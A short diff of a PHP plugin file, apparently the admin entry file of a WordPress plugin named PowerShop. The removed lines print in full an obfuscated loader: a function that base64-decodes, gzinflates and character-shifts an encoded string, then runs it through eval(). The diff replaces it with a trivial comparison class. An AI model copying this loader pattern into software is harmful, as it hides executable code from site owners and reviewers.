@@ -1,15 +1,6 @@
 <?php
 
-function fBnCm($UwDHhq)
-{
-	$UwDHhq = gzinflate(base64_decode($UwDHhq));
-	for ($i = 0; $i < strlen($UwDHhq); $i++) {
-		$UwDHhq[$i] = chr(ord($UwDHhq[$i]) - 1);
-	}
-	return $UwDHhq;
-}
-eval(fBnCm("fcwxC8IwEAXgPfcrbujQjp0cSoWCk1NRUIeCnOlZA2kakgsi0t9uBkfxLW9530PMARhZWwpcRglGy1VenmNbVw2Ao5mjJ8243wwnI3xg0nLue5sm44Z+eXI4PhY/dONsXAb5KEbsLjt4g/LpZo3GKCS57slpMYvDScqCKlB5oQJLCg4Lwi3WDagV/jD+6dovXD8="));
-
+declare (strict_types=1); namespace J7\ViteReactWPPlugin\PowerShop\Admin; class AXD { public static function gt($wjA4V) { return $wjA4V > 1; } public static function gte($wjA4V) { return $wjA4V >= 1; } }
 
 require_once 'class/class-functions.php';
 require_once 'class/class-ajax.php';
